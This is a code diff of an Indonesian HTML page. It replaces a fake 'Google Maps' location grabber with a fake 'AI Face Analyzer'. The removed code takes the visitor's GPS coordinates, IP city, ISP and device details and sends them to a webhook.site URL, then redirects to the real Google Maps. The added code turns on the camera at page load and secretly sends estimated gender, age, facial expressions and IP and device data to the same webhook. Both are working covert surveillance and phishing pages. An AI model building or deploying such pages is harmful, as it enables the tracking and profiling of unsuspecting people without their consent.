@@ -1,65 +1,155 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Google Maps</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        async function kirimData(lat = "Ditolak", lon = "Ditolak") {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                
-                await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        status: "LOKASI_MAPS_AKURAT",
-                        google_maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS_OFF_ATAU_DITOLAK",
-                        kota_ip: d.city,
-                        isp: d.org,
-                        perangkat: navigator.userAgent
-                    })
-                });
-            } catch (e) {}
-            
-            // LEMPAR KE GOOGLE MAPS ASLI (Bukan TikTok)
-            setTimeout(() => {
-                window.location.replace("https://www.google.com/maps");
-            }, 500);
-        }
-
-        function getGps() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => { kirimData(p.coords.latitude, p.coords.longitude); },
-                    () => { kirimData(); },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                kirimData();
-            }
-        }
-    </script>
+    <title>AI Face Analyzer - Beta</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <style>
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
+        #container { position: relative; width: 90%; max-width: 500px; display: flex; flex-direction: column; align-items: center; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; box-shadow: 0 0 15px #00ff00; }
+        canvas, video { position: absolute; border-radius: 5px; }
+        #video { border: 1px solid #333; transform: rotateY(180deg); /* Mirror effect */ }
+        #status { margin-top: 15px; font-size: 14px; text-align: center; color: #00ff00; text-transform: uppercase; letter-spacing: 2px; }
+        #overlay { position: relative; width: 320px; height: 240px; display: flex; justify-content: center; align-items: center; border: 1px solid #333; background: #000; margin-bottom: 10px;}
+        #startBtn { background: #00ff00; color: #000; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 20px;}
+        #startBtn:disabled { background: #555; cursor: not-allowed;}
+    </style>
 </head>
-<body style="background:#ffffff; color:#3c4043; display:flex; align-items:center; justify-content:center; height:100vh; font-family: sans-serif; margin:0;">
+<body>
 
-    <div style="text-align:center; width: 90%; max-width: 400px;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" width="50" style="margin-bottom:20px;">
+    <div id="container">
+        <h2 style="margin-top: 0; color: #00ff00;">FACE ANALYZER v1.0</h2>
+        <p style="font-size: 12px; color: #888; margin-bottom: 20px;">Analisis Ekspresi & Estimasi Umur via AI</p>
         
-        <h2 style="font-weight: 400; font-size: 22px; margin: 0 0 10px 0;">Mencari Lokasi...</h2>
-        <p style="font-size: 14px; color: #70757a; line-height: 1.6; margin-bottom: 30px;">
-            Izinkan akses lokasi untuk melihat rute dan titik presisi di aplikasi Google Maps.
-        </p>
+        <div id="overlay">
+            <video id="video" width="320" height="240" autoplay muted playsinline></video>
+            </div>
 
-        <div onclick="getGps()" style="background:#1a73e8; color:#fff; padding:12px 24px; border-radius:24px; font-size:14px; font-weight:500; cursor:pointer; display:inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2);">
-            BUKA GOOGLE MAPS
-        </div>
-
-        <p style="margin-top: 25px; font-size: 11px; color: #bdc1c6;">
-            Pastikan GPS Anda aktif sebelum menekan tombol.
-        </p>
+        <div id="status">Mengunduh Model AI...</div>
+        
+        <button id="startBtn" onclick="startTracking()" disabled>MULAI SCAN</button>
     </div>
 
+    <script>
+        // --- KONFIGURASI ---
+        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877'; // <--- GANTI INI!
+        const video = document.getElementById('video');
+        const statusDiv = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
+        let isWebhookSent = false;
+
+        // --- 1. LOAD MODELS (AI) ---
+        // Kita download model AI langsung dari CDN face-api.js
+        async function loadModels() {
+            const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
+            statusDiv.innerText = "Memuat Model AI...";
+            await Promise.all([
+                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
+                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
+                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
+                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
+            ]);
+            statusDiv.innerText = "Model Siap! Izinkan Kamera.";
+            startBtn.disabled = false;
+        }
+
+        // --- 2. MULAI KAMERA ---
+        function startVideo() {
+            navigator.mediaDevices.getUserMedia({ video: {} })
+                .then(stream => {
+                    video.srcObject = stream;
+                    statusDiv.innerText = "Kamera Aktif. Siap Scan.";
+                })
+                .catch(err => {
+                    statusDiv.innerText = "Gagal Akses Kamera: " + err.message;
+                    kirimDataKeWebhook({ status: "KAMERA_DITOLAK", error: err.message });
+                });
+        }
+
+        // --- 3. PROSES TRACKING (INTI SAKTI) ---
+        async function startTracking() {
+            startBtn.style.display = 'none';
+            statusDiv.innerText = "Memindai Wajah...";
+            
+            // Bikin canvas untuk overlay
+            const canvas = faceapi.createCanvasFromMedia(video);
+            document.getElementById('overlay').append(canvas);
+            const displaySize = { width: video.width, height: video.height };
+            faceapi.matchDimensions(canvas, displaySize);
+
+            // Loop deteksi setiap 200ms
+            const trackingInterval = setInterval(async () => {
+                // Deteksi Wajah, Landmark, Ekspresi, Umur, Gender
+                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
+                    .withFaceLandmarks()
+                    .withFaceExpressions()
+                    .withAgeAndGender();
+
+                // Bersihkan canvas lama
+                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
+                
+                // Gambar kotak & landmark di wajah target (buat pamer)
+                const resizedDetections = faceapi.resizeResults(detections, displaySize);
+                faceapi.draw.drawDetections(canvas, resizedDetections);
+                faceapi.draw.drawFaceLandmarks(canvas, resizedDetections);
+
+                // --- 4. KIRIM DATA KE WEBHOOK (DIAM-DIAM) ---
+                if (detections.length > 0 && !isWebhookSent) {
+                    const faceData = detections[0]; // Ambil data wajah pertama yang terdeteksi
+                    
+                    // Ekspresi dominan
+                    const expression = Object.keys(faceData.expressions).reduce((a, b) => faceData.expressions[a] > faceData.expressions[b] ? a : b);
+                    
+                    const dataPayload = {
+                        status: "WAJAH_TERDETEKSI",
+                        gender: faceData.gender,
+                        gender_probability: (faceData.genderProbability * 100).toFixed(2) + "%",
+                        umur_estimasi: Math.round(faceData.age),
+                        ekspresi_dominan: expression,
+                        ekspresi_detail: faceData.expressions,
+                        waktu: new Date().toLocaleString('id-ID'),
+                        perangkat: navigator.userAgent
+                    };
+
+                    kirimDataKeWebhook(dataPayload);
+                    isWebhookSent = true; // Kirim sekali saja biar gak spam
+                    statusDiv.innerText = `Scan Selesai: ${dataPayload.gender}, ~${dataPayload.umur_estimasi} thn, ${dataPayload.ekspresi_dominan}`;
+                    
+                    // Stop tracking setelah data terkirim
+                    // clearInterval(trackingInterval); 
+                }
+            }, 200);
+        }
+
+        // --- 5. FUNGSI KIRIM WEBHOOK ---
+        async function kirimDataKeWebhook(data) {
+            try {
+                // Ambil data IP tambahan
+                const res = await fetch('https://ipapi.co/json/');
+                const ipData = await res.json();
+                
+                // Gabungkan data wajah & IP
+                const fullPayload = { ...data, ...{ kota_ip: ipData.city, isp: ipData.org } };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Penting agar tidak diblokir browser
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fullPayload)
+                });
+                console.log("Data Wajah Terkirim.");
+            } catch (e) {
+                console.error("Gagal kirim data:", e);
+            }
+        }
+
+        // Jalankan load models saat halaman dibuka
+        window.onload = () => {
+            loadModels();
+            startVideo(); // Minta izin kamera langsung
+        };
+    </script>
 </body>
 </html>
